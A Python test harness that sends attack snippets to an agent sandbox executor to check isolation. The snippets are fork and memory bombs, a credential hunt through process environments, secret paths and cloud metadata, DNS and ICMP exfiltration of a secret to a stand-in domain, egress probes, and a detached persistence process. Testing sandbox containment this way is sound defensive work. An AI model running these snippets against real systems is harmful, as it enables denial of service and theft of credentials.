"""Runs inside an agent-identity pod. Submits each attack to the sandbox
executor as ordinary code, the way injected or malicious code would arrive,
and reports what the code observed. One JSON line per attack.

Usage: attack_client.py PHASE EXECUTOR_URL OTHER_SANDBOX_IP API_IP DNS_IP
PHASE "main" runs attacks the sandbox must survive; "crash" runs the one
expected to take the sandbox down, and checks the other sandbox is unaffected.
"""
import json
import sys
import urllib.request

phase, url, other_ip, api_ip, dns_ip = sys.argv[1:6]


def run(code, timeout_s=15, base=None):
    req = urllib.request.Request(f"{base or url}/run", method="POST",
                                 data=json.dumps({"code": code, "timeout_s": timeout_s}).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout_s + 20) as r:
            return json.load(r)
    except Exception as e:  # the sandbox itself may have died
        return {"transport_error": f"{type(e).__name__}: {e}"}


def healthy(base=None):
    # Must be able to fork too: leftover zombies or processes from an attack
    # would eat the executor's RLIMIT_NPROC budget and break later runs.
    r = run("import os\npid = os.fork()\nif pid == 0: os._exit(0)\nos.waitpid(pid, 0)\nprint('ok')", 5, base)
    return r.get("stdout") == "ok\n"


ATTACKS = [
    ("fork-bomb", "Exponential fork bomb for 8s", """
import os, time
t = time.monotonic(); child = False; kids = fails = 0
while time.monotonic() - t < 8:
    try:
        if os.fork() == 0:
            child = True; kids = fails = 0
        else:
            kids += 1
    except OSError:
        fails += 1
if child:
    os._exit(0)
print(f"root forked {kids}, fork failures {fails}")
""", 15),

    ("memory-bomb", "Allocate and write 1 GiB (pod limit 256 MiB)", """
chunks = []
try:
    for _ in range(32):
        chunks.append(b"\\x01" * (32 * 2**20))
    print(f"allocated {32 * len(chunks)} MiB")
except MemoryError:
    print(f"MemoryError after {32 * len(chunks)} MiB")
""", 30),

    ("credential-hunt", "Look for tokens, kubeconfigs, env secrets, cloud metadata", """
import os, glob, socket
found = []
for p in ["/var/run/secrets", "/run/secrets", os.path.expanduser("~/.kube"), "/root/.kube"]:
    if os.path.exists(p):
        found.append(p)
for f in glob.glob("/proc/*/environ"):
    try:
        env = open(f, "rb").read().decode(errors="replace")
    except OSError:
        continue
    for key in ("TOKEN", "SECRET", "PASSWORD", "API_KEY", "AWS_", "KUBECONFIG"):
        if key in env:
            found.append(f"{f}:{key}")
try:
    socket.create_connection(("169.254.169.254", 80), timeout=3)
    found.append("cloud metadata reachable")
except OSError:
    pass
print("found:", found or "nothing")
""", 20),

    ("tcp-egress", "TCP to internet, API server, cluster DNS and another sandbox", f"""
import socket
for name, h, p in [("internet", "1.1.1.1", 443), ("api-server", "{api_ip}", 443),
                   ("cluster-dns-tcp", "{dns_ip}", 53), ("other-sandbox", "{other_ip}", 8888)]:
    try:
        socket.create_connection((h, p), timeout=3); print(name, "CONNECTED")
    except OSError as e:
        print(name, "blocked", type(e).__name__)
""", 30),

    ("dns-exfil", "Encode a secret in DNS lookups (resolver and direct UDP)", f"""
import socket, struct
secret = "hunter2"
# 1. Via the configured resolver.
try:
    socket.getaddrinfo(f"{{secret}}.exfil.example.com", 80)
    print("resolver: ANSWERED")
except OSError as e:
    print("resolver: failed", type(e).__name__)
# 2. Hand-built query straight to public and cluster DNS. UDP send "succeeds"
# locally either way; what matters is whether an answer comes back (and,
# host-side, whether Hubble shows the packet dropped).
q = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
q += b"".join(bytes([len(l)]) + l.encode() for l in f"{{secret}}.exfil.example.com".split(".")) + b"\\0"
q += struct.pack(">HH", 1, 1)
for name, ip in [("public-dns", "8.8.8.8"), ("cluster-dns", "{dns_ip}")]:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
    try:
        s.sendto(q, (ip, 53)); s.recvfrom(512); print(name, "ANSWERED")
    except OSError as e:
        print(name, "no answer", type(e).__name__)
""", 30),

    ("icmp", "Ping out (raw and unprivileged ICMP sockets)", """
import socket, struct
def checksum(b):
    s = sum(struct.unpack("!%dH" % (len(b) // 2), b)); s = (s >> 16) + (s & 0xffff); return ~(s + (s >> 16)) & 0xffff
pkt = struct.pack("!BBHHH", 8, 0, 0, 1, 1) + b"exfil"
pkt = pkt[:2] + struct.pack("!H", checksum(pkt + b"\\0")) + pkt[4:]
for kind, typ in [("raw", socket.SOCK_RAW), ("dgram", socket.SOCK_DGRAM)]:
    try:
        s = socket.socket(socket.AF_INET, typ, socket.IPPROTO_ICMP); s.settimeout(3)
    except OSError as e:
        print(kind, "socket denied", type(e).__name__); continue
    try:
        s.sendto(pkt, ("1.1.1.1", 0)); s.recvfrom(512); print(kind, "REPLY")
    except OSError as e:
        print(kind, "no reply", type(e).__name__)
""", 20),
]

PERSIST_START = """
import os, time
if os.fork() == 0:
    os.setsid()                       # leave the run's process group
    if os.fork() == 0:
        while True:                   # beacon: proves it's still alive
            open("/tmp/beacon", "w").write(str(time.time())); time.sleep(0.5)
    os._exit(0)
print("background process started")
"""
PERSIST_CHECK = """
import os, time
time.sleep(2)
try:
    age = time.time() - float(open("/tmp/beacon").read())
    print(f"beacon last written {age:.1f}s ago:", "STILL RUNNING" if age < 1.5 else "stopped")
except FileNotFoundError:
    print("no beacon")
"""

# Under gVisor this kills the whole sandbox (the agent sees a transport
# error); under Kata the guest kernel OOM-kills some of the processes and the
# sandbox lives. Either way the limit must hold: never all 8 holding 64 MiB.
CRASH = ("memory-bomb-multiprocess",
         "8 processes x 64 MiB each: every one under the per-process cap, 512 MiB in total", """
import os, time
kids = []
for _ in range(8):
    pid = os.fork()
    if pid == 0:
        x = b"\\x01" * (64 * 2**20); time.sleep(15); os._exit(0)
    kids.append(pid)
killed = 0
for pid in kids:
    _, st = os.waitpid(pid, 0)
    killed += os.WIFSIGNALED(st) and os.WTERMSIG(st) == 9
print(f"{8 - killed} of 8 survived, {killed} OOM-killed")
""", 30)

if phase == "main":
    for aid, desc, code, timeout_s in ATTACKS:
        r = run(code, timeout_s)
        print(json.dumps({"id": aid, "desc": desc, "result": r, "healthy_after": healthy()}), flush=True)
    started = run(PERSIST_START)
    r = run(PERSIST_CHECK)
    r["stdout"] = started.get("stdout", "") + r.get("stdout", "")
    print(json.dumps({"id": "persistence", "desc": "Detach a background process (setsid) to outlive the run",
                      "result": r, "healthy_after": healthy()}), flush=True)
else:
    aid, desc, code, timeout_s = CRASH
    r = run(code, timeout_s)
    print(json.dumps({"id": aid, "desc": desc, "result": r,
                      "other_sandbox_healthy": healthy(f"http://{other_ip}:8888")}), flush=True)
